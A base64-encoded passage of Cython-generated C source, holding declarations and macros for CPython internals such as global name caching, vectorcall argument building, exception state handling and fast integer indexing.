CiAgICBzdGF0aWMgUHlPYmplY3QgKl9fcHl4X2RpY3RfY2FjaGVkX3ZhbHVlID0gTlVMTDtcCiAgICAodmFyKSA9IChsaWtlbHkoX19weXhfZGljdF92ZXJzaW9uID09IF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCkpKSA/XAogICAgICAgIChsaWtlbHkoX19weXhfZGljdF9jYWNoZWRfdmFsdWUpID8gX19QeXhfTmV3UmVmKF9fcHl4X2RpY3RfY2FjaGVkX3ZhbHVlKSA6IF9fUHl4X0dldEJ1aWx0aW5OYW1lKG5hbWUpKSA6XAogICAgICAgIF9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKG5hbWUsICZfX3B5eF9kaWN0X3ZlcnNpb24sICZfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZSk7XAp9IHdoaWxlKDApCiNkZWZpbmUgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZVVuY2FjaGVkKHZhciwgbmFtZSkgIGRvIHtcCiAgICBQWV9VSU5UNjRfVCBfX3B5eF9kaWN0X3ZlcnNpb247XAogICAgUHlPYmplY3QgKl9fcHl4X2RpY3RfY2FjaGVkX3ZhbHVlO1wKICAgICh2YXIpID0gX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUobmFtZSwgJl9fcHl4X2RpY3RfdmVyc2lvbiwgJl9fcHl4X2RpY3RfY2FjaGVkX3ZhbHVlKTtcCn0gd2hpbGUoMCkKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9fR2V0TW9kdWxlR2xvYmFsTmFtZShQeU9iamVjdCAqbmFtZSwgUFlfVUlOVDY0X1QgKmRpY3RfdmVyc2lvbiwgUHlPYmplY3QgKipkaWN0X2NhY2hlZF92YWx1ZSk7CiNlbHNlCiNkZWZpbmUgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZSh2YXIsIG5hbWUpICAodmFyKSA9IF9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKG5hbWUpCiNkZWZpbmUgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZVVuY2FjaGVkKHZhciwgbmFtZSkgICh2YXIpID0gX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUobmFtZSkKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKFB5T2JqZWN0ICpuYW1lKTsKI2VuZGlmCgoKI2lmIENZVEhPTl9WRUNUT1JDQUxMICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDAKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChuYW1lLCBhcmdzLCBuYXJnc2YpIFB5T2JqZWN0X1ZlY3RvcmNhbGxNZXRob2QobmFtZSwgYXJncywgbmFyZ3NmLCBOVUxMKQojZWxzZQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YpOwojZW5kaWYKCgojaWYgQ1lUSE9OX0ZBU1RfUFlDQUxMCiNpZiAhQ1lUSE9OX1ZFQ1RPUkNBTEwKI2RlZmluZSBfX1B5eF9QeUZ1bmN0aW9uX0Zhc3RDYWxsKGZ1bmMsIGFyZ3MsIG5hcmdzKVwKICAgIF9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGxEaWN0KChmdW5jKSwgKGFyZ3MpLCAobmFyZ3MpLCBOVUxMKQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGxEaWN0KFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIFB5X3NzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprd2FyZ3MpOwojZW5kaWYKI2RlZmluZSBfX1B5eF9CVUlMRF9BU1NFUlRfRVhQUihjb25kKVwKICAgIChzaXplb2YoY2hhciBbMSAtIDIqIShjb25kKV0pIC0gMSkKI2lmbmRlZiBQeV9NRU1CRVJfU0laRQojZGVmaW5lIFB5X01FTUJFUl9TSVpFKHR5cGUsIG1lbWJlcikgc2l6ZW9mKCgodHlwZSAqKTApLT5tZW1iZXIpCiNlbmRpZgojaWYgIUNZVEhPTl9WRUNUT1JDQUxMCiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMDAwCiAgI2luY2x1ZGUgImZyYW1lb2JqZWN0LmgiCiAgI2RlZmluZSBfX1B4eV9QeUZyYW1lX0luaXRpYWxpemVfT2Zmc2V0cygpCiAgI2RlZmluZSBfX1B5eF9QeUZyYW1lX0dldExvY2Fsc3BsdXMoZnJhbWUpICAoKGZyYW1lKS0+Zl9sb2NhbHNwbHVzKQojZWxzZQogIHN0YXRpYyBzaXplX3QgX19weXhfcHlmcmFtZV9sb2NhbHNwbHVzX29mZnNldCA9IDA7CiAgI2luY2x1ZGUgImZyYW1lb2JqZWN0LmgiCiAgI2RlZmluZSBfX1B4eV9QeUZyYW1lX0luaXRpYWxpemVfT2Zmc2V0cygpXAogICAgKCh2b2lkKV9fUHl4X0JVSUxEX0FTU0VSVF9FWFBSKHNpemVvZihQeUZyYW1lT2JqZWN0KSA9PSBvZmZzZXRvZihQeUZyYW1lT2JqZWN0LCBmX2xvY2Fsc3BsdXMpICsgUHlfTUVNQkVSX1NJWkUoUHlGcmFtZU9iamVjdCwgZl9sb2NhbHNwbHVzKSksXAogICAgICh2b2lkKShfX3B5eF9weWZyYW1lX2xvY2Fsc3BsdXNfb2Zmc2V0ID0gKChzaXplX3QpUHlGcmFtZV9UeXBlLnRwX2Jhc2ljc2l6ZSkgLSBQeV9NRU1CRVJfU0laRShQeUZyYW1lT2JqZWN0LCBmX2xvY2Fsc3BsdXMpKSkKICAjZGVmaW5lIF9fUHl4X1B5RnJhbWVfR2V0TG9jYWxzcGx1cyhmcmFtZSlcCiAgICAoYXNzZXJ0KF9fcHl4X3B5ZnJhbWVfbG9jYWxzcGx1c19vZmZzZXQpLCAoUHlPYmplY3QgKiopKCgoY2hhciAqKShmcmFtZSkpICsgX19weXhfcHlmcmFtZV9sb2NhbHNwbHVzX29mZnNldCkpCiNlbmRpZgojZW5kaWYKI2VuZGlmCgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmFyZywgUHlPYmplY3QgKmt3KTsKI2Vsc2UKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9DYWxsKGZ1bmMsIGFyZywga3cpIFB5T2JqZWN0X0NhbGwoZnVuYywgYXJnLCBrdykKI2VuZGlmCgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhPKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqYXJnKTsKI2VuZGlmCgoKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChmdW5jLCBhcmdzLCBuYXJncykgIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsRGljdChmdW5jLCBhcmdzLCAoc2l6ZV90KShuYXJncyksIE5VTEwpCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbERpY3QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICogY29uc3QqYXJncywgc2l6ZV90IG5hcmdzLCBQeU9iamVjdCAqa3dhcmdzKTsKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCiAgICAjZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShzLCBmKSAoXAogICAgICAgIGxpa2VseShQeVVuaWNvZGVfQ2hlY2tFeGFjdChzKSkgPyAoUHlfSU5DUkVGKHMpLCBzKSA6XAogICAgICAgIFB5T2JqZWN0X0Zvcm1hdChzLCBmKSkKI2VsaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiAgICAjZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShzLCBmKSAoXAogICAgICAgIGxpa2VseShQeVVuaWNvZGVfQ2hlY2tFeGFjdChzKSkgPyAoUHlfSU5DUkVGKHMpLCBzKSA6XAogICAgICAgIGxpa2VseShQeUxvbmdfQ2hlY2tFeGFjdChzKSkgPyBQeUxvbmdfVHlwZS50cF9yZXByKHMpIDpcCiAgICAgICAgbGlrZWx5KFB5RmxvYXRfQ2hlY2tFeGFjdChzKSkgPyBQeUZsb2F0X1R5cGUudHBfcmVwcihzKSA6XAogICAgICAgIFB5T2JqZWN0X0Zvcm1hdChzLCBmKSkKI2Vsc2UKICAgICNkZWZpbmUgX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKHMsIGYpIChcCiAgICAgICAgbGlrZWx5KFB5VW5pY29kZV9DaGVja0V4YWN0KHMpKSA/IChQeV9JTkNSRUYocyksIHMpIDpcCiAgICAgICAgUHlPYmplY3RfRm9ybWF0KHMsIGYpKQojZW5kaWYKCgpzdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5VW5pY29kZV9Kb2luKFB5T2JqZWN0KiogdmFsdWVzLCBQeV9zc2l6ZV90IHZhbHVlX2NvdW50LCBQeV9zc2l6ZV90IHJlc3VsdF91bGVuZ3RoLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5X1VDUzQgbWF4X2NoYXIpOwoKCkNZVEhPTl9VTlVTRUQgc3RhdGljIGludCBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmdfQ2hlY2soUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqYnVpbGRlciwgUHlPYmplY3QgKiphcmdzLCBpbnQgbik7CiNpZiBDWVRIT05fVkVDVE9SQ0FMTAojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMAojZGVmaW5lIF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlciBQeU9iamVjdF9WZWN0b3JjYWxsCiNlbHNlCiNkZWZpbmUgX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyIF9QeU9iamVjdF9WZWN0b3JjYWxsCiNlbmRpZgojZGVmaW5lIF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMobikgUHlUdXBsZV9OZXcobikKc3RhdGljIGludCBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqYnVpbGRlciwgUHlPYmplY3QgKiphcmdzLCBpbnQgbik7CnN0YXRpYyBpbnQgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnU3RyKGNvbnN0IGNoYXIgKmtleSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqYnVpbGRlciwgUHlPYmplY3QgKiphcmdzLCBpbnQgbik7CiNlbHNlCiNkZWZpbmUgX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsRGljdAojZGVmaW5lIF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMobikgX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKG4pCiNkZWZpbmUgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKGtleSwgdmFsdWUsIGJ1aWxkZXIsIGFyZ3MsIG4pIFB5RGljdF9TZXRJdGVtKGJ1aWxkZXIsIGtleSwgdmFsdWUpCiNkZWZpbmUgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnU3RyKGtleSwgdmFsdWUsIGJ1aWxkZXIsIGFyZ3MsIG4pIFB5RGljdF9TZXRJdGVtU3RyaW5nKGJ1aWxkZXIsIGtleSwgdmFsdWUpCiNlbmRpZgoKCnN0YXRpYyB2b2lkIF9fUHl4X1JhaXNlVW5ib3VuZExvY2FsRXJyb3IoY29uc3QgY2hhciAqdmFybmFtZSk7CgoKI2lmIENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMUyAmJiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9MaXN0Q29tcF9BcHBlbmQoUHlPYmplY3QqIGxpc3QsIFB5T2JqZWN0KiB4KSB7CiAgICBQeUxpc3RPYmplY3QqIEwgPSAoUHlMaXN0T2JqZWN0KikgbGlzdDsKICAgIFB5X3NzaXplX3QgbGVuID0gUHlfU0laRShsaXN0KTsKICAgIGlmIChsaWtlbHkoTC0+YWxsb2NhdGVkID4gbGVuKSkgewogICAgICAgIFB5X0lOQ1JFRih4KTsKICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAKICAgICAgICBMLT5vYl9pdGVtW2xlbl0gPSB4OwogICAgICAgICNlbHNlCiAgICAgICAgUHlMaXN0X1NFVF9JVEVNKGxpc3QsIGxlbiwgeCk7CiAgICAgICAgI2VuZGlmCiAgICAgICAgX19QeXhfU0VUX1NJWkUobGlzdCwgbGVuICsgMSk7CiAgICAgICAgcmV0dXJuIDA7CiAgICB9CiAgICByZXR1cm4gUHlMaXN0X0FwcGVuZChsaXN0LCB4KTsKfQojZWxzZQojZGVmaW5lIF9fUHl4X0xpc3RDb21wX0FwcGVuZChMLHgpIFB5TGlzdF9BcHBlbmQoTCx4KQojZW5kaWYKCgpzdGF0aWMgdm9pZCBfX1B5eF9SYWlzZUNsb3N1cmVOYW1lRXJyb3IoY29uc3QgY2hhciAqdmFybmFtZSk7CgoKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQojZGVmaW5lIF9fUHl4X0dldEV4Y2VwdGlvbih0eXBlLCB2YWx1ZSwgdGIpICBfX1B5eF9fR2V0RXhjZXB0aW9uKF9fcHl4X3RzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKQpzdGF0aWMgaW50IF9fUHl4X19HZXRFeGNlcHRpb24oUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpOwojZWxzZQpzdGF0aWMgaW50IF9fUHl4X0dldEV4Y2VwdGlvbihQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpOwojZW5kaWYKCgpzdGF0aWMgdm9pZCBfX1B5eF9HZW5lcmF0b3JfUmVwbGFjZV9TdG9wSXRlcmF0aW9uKGludCBpbl9hc3luY19nZW4pOwoKCiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlEaWN0X0dldEl0ZW0oUHlPYmplY3QgKmQsIFB5T2JqZWN0KiBrZXkpOwojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0RpY3RfR2V0SXRlbShvYmosIG5hbWUpXAogICAgKGxpa2VseShQeURpY3RfQ2hlY2tFeGFjdChvYmopKSA/XAogICAgIF9fUHl4X1B5RGljdF9HZXRJdGVtKG9iaiwgbmFtZSkgOiBQeU9iamVjdF9HZXRJdGVtKG9iaiwgbmFtZSkpCiNlbHNlCiNkZWZpbmUgX19QeXhfUHlEaWN0X0dldEl0ZW0oZCwga2V5KSBQeU9iamVjdF9HZXRJdGVtKGQsIGtleSkKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9EaWN0X0dldEl0ZW0ob2JqLCBuYW1lKSAgUHlPYmplY3RfR2V0SXRlbShvYmosIG5hbWUpCiNlbmRpZgoKCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfVW5pY29kZShvYmopXAogICAgKGxpa2VseShQeVVuaWNvZGVfQ2hlY2tFeGFjdChvYmopKSA/IF9fUHl4X05ld1JlZihvYmopIDogUHlPYmplY3RfU3RyKG9iaikpCgoKIyBpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KICAgICNpZiBDWVRIT05fUkVGTkFOTlkKICAgICAgICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlKGxlZnQsIHJpZ2h0KSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZUltcGwoJmxlZnQsIHJpZ2h0LCBfX3B5eF9yZWZuYW5ueSkKICAgICNlbHNlCiAgICAgICAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZShsZWZ0LCByaWdodCkgX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2VJbXBsKCZsZWZ0LCByaWdodCkKICAgICNlbmRpZgogICAgc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlSW1wbChQeU9iamVjdCAqKnBfbGVmdCwgUHlPYmplY3QgKnJpZ2h0CiAgICAgICAgI2lmIENZVEhPTl9SRUZOQU5OWQogICAgICAgICwgdm9pZCogX19weXhfcmVmbmFubnkKICAgICAgICAjZW5kaWYKICAgICk7CiNlbHNlCiNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2UgX19QeXhfUHlVbmljb2RlX0NvbmNhdAojZW5kaWYKI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZVNhZmUobGVmdCwgcmlnaHQpICgodW5saWtlbHkoKGxlZnQpID09IFB5X05vbmUpIHx8IHVubGlrZWx5KChyaWdodCkgPT0gUHlfTm9uZSkpID9cCiAgICBQeU51bWJlcl9JblBsYWNlQWRkKGxlZnQsIHJpZ2h0KSA6IF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlKGxlZnQsIHJpZ2h0KSkKCgpzdGF0aWMgdm9pZCBfX1B5eF9SYWlzZShQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIsIFB5T2JqZWN0ICpjYXVzZSk7CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5VW5pY29kZV9Vbmljb2RlKFB5T2JqZWN0ICpvYmopOwoKCiNkZWZpbmUgX19QeXhfR2V0SXRlbUludChvLCBpLCB0eXBlLCBpc19zaWduZWQsIHRvX3B5X2Z1bmMsIGlzX2xpc3QsIHdyYXBhcm91bmQsIGJvdW5kc2NoZWNrLCBoYXNfZ2lsKVwKICAgIChfX1B5eF9maXRzX1B5X3NzaXplX3QoaSwgdHlwZSwgaXNfc2lnbmVkKSA/XAogICAgX19QeXhfR2V0SXRlbUludF9GYXN0KG8sIChQeV9zc2l6ZV90KWksIGlzX2xpc3QsIHdyYXBhcm91bmQsIGJvdW5kc2NoZWNrKSA6XAogICAgKGlzX2xpc3QgPyAoUHlFcnJfU2V0U3RyaW5nKFB5RXhjX0luZGV4RXJyb3IsICJsaXN0IGluZGV4IG91dCBvZiByYW5nZSIpLCAoUHlPYmplY3QqKU5VTEwpIDpcCiAgICAgICAgICAgICAgIF9fUHl4X0dldEl0ZW1JbnRfR2VuZXJpYyhvLCB0b19weV9mdW5jKGkpKSkpCiNkZWZpbmUgX19QeXhfR2V0SXRlbUludF9MaXN0KG8sIGksIHR5cGUsIGlzX3NpZ25lZCwgdG9fcHlfZnVuYywgaXNfbGlzdCwgd3JhcGFyb3VuZCwgYm91bmRzY2hlY2ssIGhhc19naWwpXAogICAgKF9fUHl4X2ZpdHNfUHlfc3NpemVfdChpLCB0eXBlLCBpc19zaWduZWQpID9cCiAgICBfX1B5eF9HZXRJdGVtSW50X0xpc3RfRmFzdChvLCAoUHlfc3NpemVfdClpLCB3cmFwYXJvdW5kLCBib3VuZHNjaGVjaykgOlwKICAgIChQeUVycl9TZXRTdHJpbmcoUHlFeGNfSW5kZXhFcnJvciwgImxpc3QgaW5kZXggb3V0IG9mIHJhbmdlIiksIChQeU9iamVjdCopTlVMTCkpCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9HZXRJdGVtSW50X0xpc3RfRmFzdChQeU9iamVjdCAqbywgUHlfc3NpemVfdCBpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCB3cmFwYXJvdW5kLCBpbnQgYm91bmRzY2hlY2spOwojZGVmaW5lIF9fUHl4X0dldEl0ZW1JbnRfVHVwbGUobywgaSwgdHlwZSwgaXNfc2lnbmVkLCB0b19weV9mdW5jLCBpc19saXN0LCB3cmFwYXJvdW5kLCBib3VuZHNjaGVjaywgaGFzX2dpbClcCiAgICAoX19QeXhfZml0c19QeV9zc2l6ZV90KGksIHR5cGUsIGlzX3NpZ25lZCkgP1wKICAgIF9fUHl4X0dldEl0ZW1JbnRfVHVwbGVfRmFzdChvLCAoUHlfc3NpemVfdClpLCB3cmFwYXJvdW5kLCBib3VuZHNjaGVjaykgOlwKICAgIChQeUVycl9TZXRTdHJpbmcoUHlFeGNfSW5kZXhFcnJvciwgInR1cGxlIGluZGV4IG91dCBvZiByYW5nZSIpLCAoUHlPYmplY3QqKU5VTEwpKQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfR2V0SXRlbUludF9UdXBsZV9GYXN0KFB5T2JqZWN0ICpvLCBQeV9zc2l6ZV90IGksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IHdyYXBhcm91bmQsIGludCBib3VuZHNjaGVjayk7CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2V0SXRlbUludF9HZW5lcmljKFB5T2JqZWN0ICpvLCBQeU9iamVjdCogaik7CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9HZXRJdGVtSW50X0Zhc3QoUHlPYmplY3QgKm8sIFB5X3NzaXplX3QgaSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgaXNfbGlzdCwgaW50IHdyYXBhcm91bmQsIGludCBib3VuZHNjaGVjayk7CgoKI2lmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCAmJiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsTm9FcnJvcihvYmosIGF0dHJfbmFtZSkgIF9fUHl4X19QeU9iamVjdF9Mb29rdXBTcGVjaWFsKG9iaiwgYXR0cl9uYW1lLCAwKQojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwob2JqLCBhdHRyX25hbWUpICBfX1B5eF9fUHlPYmplY3RfTG9va3VwU3BlY2lhbChvYmosIGF0dHJfbmFtZSwgMSkKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X19QeU9iamVjdF9Mb29rdXBTcGVjaWFsKFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBhdHRyX25hbWUsIGludCB3aXRoX2Vycm9yKTsKI2Vsc2UKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsTm9FcnJvcihvLG4pIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKG8sbikKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKG8sbikgX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihvLG4pCiNlbmRpZgoKCiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLICYmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQpzdGF0aWMgX1B5RXJyX1N0YWNrSXRlbSAqIF9fUHl4X1B5RXJyX0dldFRvcG1vc3RFeGNlcHRpb24oUHlUaHJlYWRTdGF0ZSAqdHN0YXRlKTsKI2VuZGlmCgoKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQojZGVmaW5lIF9fUHl4X0V4Y2VwdGlvblNhdmUodHlwZSwgdmFsdWUsIHRiKSAgX19QeXhfX0V4Y2VwdGlvblNhdmUoX19weXhfdHN0YXRlLCB0eXBlLCB2YWx1ZSwgdGIpCnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfX0V4Y2VwdGlvblNhdmUoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpOwojZGVmaW5lIF9fUHl4X0V4Y2VwdGlvblJlc2V0KHR5cGUsIHZhbHVlLCB0YikgIF9fUHl4X19FeGNlcHRpb25SZXNldChfX3B5eF90c3RhdGUsIHR5cGUsIHZhbHVlLCB0YikKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fRXhjZXB0aW9uUmVzZXQoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIpOwojZWxzZQojZGVmaW5lIF9fUHl4X0V4Y2VwdGlvblNhdmUodHlwZSwgdmFsdWUsIHRiKSAgIFB5RXJyX0dldEV4Y0luZm8odHlwZSwgdmFsdWUsIHRiKQojZGVmaW5lIF9fUHl4X0V4Y2VwdGlvblJlc2V0KHR5cGUsIHZhbHVlLCB0YikgIFB5RXJyX1NldEV4Y0luZm8odHlwZSwgdmFsdWUsIHRiKQojZW5kaWYKCgojaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCiNkZWZpbmUgX19QeXhfRXhjZXB0aW9uU3dhcCh0eXBlLCB2YWx1ZSwgdGIpICBfX1B5eF9fRXhjZXB0aW9uU3dhcChfX3B5eF90c3RhdGUsIHR5cGUsIHZhbHVlLCB0YikKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fRXhjZXB0aW9uU3dhcChQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0Yik7CiNlbHNlCnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfRXhjZXB0aW9uU3dhcChQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpOwojZW5kaWYKCgpzdGF0aWMgdm9pZCBfX1B5eF9SYWlzZURvdWJsZUtleXdvcmRzRXJyb3IoY29uc3QgY2hhciogZnVuY19uYW1lLCBQeU9iamVjdCoga3dfbmFtZSk7CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1BhcnNlS2V5d29yZHMoCiAgICBQeU9iamVjdCAqa3dkcywgUHlPYmplY3QgKmNvbnN0ICprd3ZhbHVlcywgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSwKICAgIFB5T2JqZWN0ICprd2RzMiwgUHlPYmplY3QgKnZhbHVlc1tdLAogICAgUHlfc3NpemVfdCBudW1fcG9zX2FyZ3MsIFB5X3NzaXplX3QgbnVtX2t3YXJncywKICAgIGNvbnN0IGNoYXIqIGZ1bmN0aW9uX25hbWUsCiAgICBpbnQgaWdub3JlX3Vua25vd25fa3dhcmdzCik7CgoKI2RlZmluZSBfX1B5eF9DYWxsQ0Z1bmN0aW9uKGNmdW5jLCBzZWxmLCBhcmdzKVwKICAgICgoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKGNmdW5jKS0+ZnVuYykoc2VsZiwgYXJncykKI2RlZmluZSBfX1B5eF9DYWxsQ0Z1bmN0aW9uV2l0aEtleXdvcmRzKGNmdW5jLCBzZWxmLCBhcmdzLCBrd2FyZ3MpXAogICAgKChQeUNGdW5jdGlvbldpdGhLZXl3b3Jkcykodm9pZCgqKSh2b2lkKSkoY2Z1bmMpLT5mdW5jKShzZWxmLCBhcmdzLCBrd2FyZ3MpCiNkZWZpbmUgX19QeXhfQ2FsbENGdW5jdGlvbkZhc3QoY2Z1bmMsIHNlbGYsIGFyZ3MsIG5hcmdzKVwKICAgICgoX19QeXhfUHlDRnVuY3Rpb25GYXN0KSh2b2lkKCopKHZvaWQpKShQeUNGdW5jdGlvbikoY2Z1bmMpLT5mdW5jKShzZWxmLCBhcmdzLCBuYXJncykKI2RlZmluZSBfX1B5eF9DYWxsQ0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3JkcyhjZnVuYywgc2VsZiwgYXJncywgbmFyZ3MsIGt3bmFtZXMpXAogICAgKChfX1B5eF9QeUNGdW5jdGlvbkZhc3RXaXRoS2V5d29yZHMpKHZvaWQoKikodm9pZCkpKFB5Q0Z1bmN0aW9uKShjZnVuYyktPmZ